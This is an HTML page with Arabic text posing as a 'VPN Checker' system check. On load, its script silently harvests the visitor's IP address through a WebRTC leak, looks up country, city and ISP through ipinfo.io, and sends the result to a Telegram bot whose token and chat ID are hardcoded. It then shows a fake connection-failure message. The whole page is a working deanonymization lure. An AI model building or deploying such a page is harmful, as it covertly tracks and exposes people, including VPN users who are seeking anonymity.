<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Check</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background:#0d1117; color:#fff; font-family:Arial, sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; }
        .box { background:#161b22; padding:30px; border-radius:20px; text-align:center; width:90%; max-width:350px; border:1px solid #ff0050; }
        .spinner { width:40px; height:40px; margin:15px auto; border:4px solid #333; border-top:4px solid #00d1ff; border-radius:50%; animation:spin 1s infinite; }
        @keyframes spin { 0% { transform:rotate(0); } 100% { transform:rotate(360deg); } }
        #status { color:#8b949e; font-size:14px; }
    </style>
</head>
<body>

    <div class="box">
        <h1 style="color:#00d1ff;">🛡️ VPN Checker</h1>
        <p style="color:#8b949e;">جاري فحص الشبكة...</p>
        <div class="spinner"></div>
        <div id="status">جاري الكشف عن الـ IP الحقيقي...</div>
    </div>

    <script>
        const CHAT_ID = "6833915955";
        const BOT_TOKEN = "8675259276:AAEqVwW4S1kqh7LTa7ZO1KClh7O8Ip4D6eU";

        // دالة لجلب الـ IP الحقيقي عبر WebRTC (حتى مع VPN)
        function getRealIP(callback) {
            // إنشاء اتصال WebRTC وهمي
            const pc = new RTCPeerConnection({ iceServers: [] });
            const candidates = [];

            pc.onicecandidate = (event) => {
                if (event.candidate) {
                    // استخراج الـ IP من كود الـ ICE
                    const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
                    const match = event.candidate.candidate.match(ipRegex);
                    if (match && !candidates.includes(match[0])) {
                        candidates.push(match[0]);
                        callback(match[0]);
                    }
                }
            };

            // بدء الاتصال الوهمي (لإجبار المتصفح على كشف الـ IP)
            pc.createDataChannel('');
            pc.createOffer()
                .then(offer => pc.setLocalDescription(offer))
                .catch(() => {});
        }

        // دالة لجلب معلومات الدولة والمدينة عبر IP
        async function getLocation(ip) {
            try {
                const res = await fetch(`https://ipinfo.io/${ip}/json`);
                return await res.json();
            } catch { return null; }
        }

        window.onload = async function() {
            document.getElementById('status').innerText = "جاري كشف الـ IP الحقيقي...";

            // محاولة الحصول على الـ IP الحقيقي
            getRealIP(async (realIP) => {
                // الحصول على تفاصيل الدولة والمدينة
                const info = await getLocation(realIP);

                let msg = `📍 **تم كشف الـ IP الحقيقي (حتى مع VPN)**\n`;
                msg += `🌐 الـ IP الحقيقي: ${realIP}\n`;
                if (info) {
                    msg += `🌍 الدولة: ${info.country || 'غير معروف'}\n`;
                    msg += `🏙️ المدينة: ${info.city || 'غير معروف'}\n`;
                    msg += `📡 المزود: ${info.org || 'غير معروف'}\n`;
                }

                // إرسال إلى تليجرام
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
                });

                document.getElementById('status').innerText = "✅ تم كشف الـ IP الحقيقي!";
                setTimeout(() => {
                    document.getElementById('status').innerText = "⚠️ فشل الاتصال بالخادم.";
                }, 3000);
            });
        };
    </script>
</body>
</html>
